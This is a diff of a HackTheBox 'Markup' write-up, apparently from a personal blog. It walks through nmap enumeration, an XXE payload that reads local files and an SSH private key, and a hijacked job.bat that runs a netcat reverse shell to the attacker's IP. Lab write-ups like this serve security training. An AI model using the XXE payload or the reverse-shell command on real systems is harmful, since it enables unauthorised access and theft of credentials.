@@ -1,33 +1,44 @@
 ---
+weight: 1
 title: "HackTheBox - Markup Writeup"
 date: 2021-08-06
 draft: false
-tags: ["xxe"]
-htb: "HacktheBox"
-windows: "Windows"
+author: "SH∆FIQ ∆IM∆N"
+authorLink: "https://shafiqaiman.com"
+images: []
+resources:
+- name: "featured-image"
+  src: "featured.png"
+
+tags: ["xxe", "xxe-read-file", "icacls", "checking-file-permission-windows"]
+categories: ["HacktheBox"]
+
+lightgallery: true
+toc:
+  auto: false
 ---
 
 ## Enumeration
 
 - Top 1000 ports scan
 
-```sql
+```bash
 nmap -sC -sV -oN nmap/initial 10.10.10.49
 ```
 
 - the result
 
-![1](nmap_1000.png)
+![nmap initial scan](nmap_1000.png "nmap initial scan")
 
 - All ports scan
 
-```sql
+```bash
 nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 ```
 
 - the result
 
-![1](nmap_all_ports.png)
+![nmap allports scan](nmap_all_ports.png "nmap allports scan")
 
 ### Open Ports
 - Well, both the Nmap scan result are the same
@@ -40,13 +51,13 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 - Let's take a look at the webpage `HTTP`
 
 
-![1](login.png)
+![login webpage](login.png "login webpage")
 
 - Look's like just a regular login page.
 - We can try to login with `credentials` we've found from the `previous box` called `Included`
 - Let's try it
 
-![1](home.png)
+![home webpage](home.png "home webpage")
 
 - Success
 - Now, time to `enumerate/play around` with this page.
@@ -56,7 +67,7 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 - Let's try ordering something
 - the result
 
-![1](order.png)
+![order alerted](order.png "order alerted")
 
 - Every time a user orders something it's always `pop up this message`.
 - Let's try check `how this form handle the request`
@@ -67,7 +78,7 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 - I found this body kinda weird at first.
 - It's `doesn't look` like any `JSON` data
 
-![1](xml.png)
+![xml post data](xml.png "xml post data")
 
 -  Then, I realize this is `XML [Extensible Markup Language]`
 -  Well, I heard something about `XML injection` before
@@ -75,8 +86,11 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 
 ## XXE [XML External Entity Injection]
 
-> An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.
-> Wikipedia - [XML external entity attack](https://en.wikipedia.org/wiki/XML_external_entity_attack)
+{{< admonition tip "Description" >}}
+An `XML External Entity` attack is a type of attack against an application that parses XML input. </br>
+This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. </br>
+- Wikipedia - [XML external entity attack](https://en.wikipedia.org/wiki/XML_external_entity_attack)
+{{< /admonition >}}
 
 - Source
     - [[YouTube]PwnFunction - XML External Entities (Explained)](https://www.youtube.com/watch?v=gjm6VHZa_8s)
@@ -99,7 +113,7 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 ```
 - the result
 
-![1](XML-test.png)
+![xxe result](XML-test.png "xxe result")
 
 - it is working
 
@@ -107,9 +121,7 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 - Now, Let's try to `read a file with it`
 - So, I'm gonna insert this command
 
-
-
- ```xml
+```xml
 <?xml version = "1.0"?>
 <!DOCTYPE foo [<!ENTITY example SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
 <order>
@@ -123,11 +135,11 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
         Bed for sleeping of course
     </address>
 </order>
- ```
+```
  
- - the result
+- the result
 
-![1](host.png)
+![xxe read file](host.png "xxe read file")
 
 - Wow! It works
 
@@ -157,13 +169,15 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 
 - the result
 
-![1](ssh-prikey.png)
+![xxe read ssh key](ssh-prikey.png "xxe read ssh key")
 
 - WOW! we've got the private key
 - Let's copy it and try login with SSH
 
-> Before we can log in. Make sure to change the permission of the key with the command
-> `chmod 600 <filename>`
+{{< admonition tip >}}
+Before we can log in. Make sure to change the permission of the key with the command
+`chmod 600 <filename>`
+{{< /admonition >}}
 
 - Now, Let's try login with this command
 
@@ -171,26 +185,26 @@ nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
 ssh -i <filename> daniel@10.10.10.49
 ```
 
-![1](ssh.png)
+![ssh as daniel](ssh.png "ssh as daniel")
 
 - I'm in
 
 ### User Flag
 
-![1](user.png)
+![user flag](user.png "user flag")
 
 ### Log-Management
 - Let's start to enumerate this machine
 - I found kinda `sus` folder in the root directory
     - _<font color="yellow">maybe I don't know it's actually exists</font>_
 
-![1](log-manage.png)
+![found Log-Management directory](log-manage.png "found Log-Management directory")
 
 - The folder called `Log-Management`
 - Found the file name `job.bat` and see the content of that file
 
 
-![1](job.png)
+![contents inside job.bat file](job.png "contents inside job.bat file")
 
 - So, I'm gonna assume this script for `clearing event log` and gonna `run automatically like UNIX cronjob`
 -  `¯\__(ツ)_/¯`
@@ -210,7 +224,7 @@ ssh -i <filename> daniel@10.10.10.49
 icacls job.txt
 ```
 
-![1](icacls.png)
+![checking file permission](icacls.png "checking file permission")
 
 - we've got `full access` to that file
 - remember we're still `daniel`
@@ -225,23 +239,23 @@ icacls job.txt
 
 > <font color="yellow">Windows do not come with nc installed. So, we need to upload it</font>
 
-![1](awang_2.png)
+![transfer nc.exe](awang_2.png "transfer nc.exe")
 
 - First, let's start our `nc for listening to the connection`
 - Then, put this payload in `job.bat`
 ```powershell
 c:\log-management\nc.exe -e cmd.exe 10.10.14.43 9901
 ```
-![1](tulis.png)
+![put the payload in job.bat file](tulis.png "put the payload in job.bat file")
 
 - the result
 - we've got the `shell` and own the box
 
-![1](yes.png)
+![shell as administrator](yes.png "shell as administrator")
 
 ### Admin Flag
 
-![1](root.png)
+![root flag](root.png "root flag")
 
 ## Conclusion
 I've learned a lot today. The XXE is so cool and it also can be dangerous if the input is not properly configured. Talk about "configure". The file admin can run also need to configure properly in this case file called job.bat. Once again, don't use the same password.
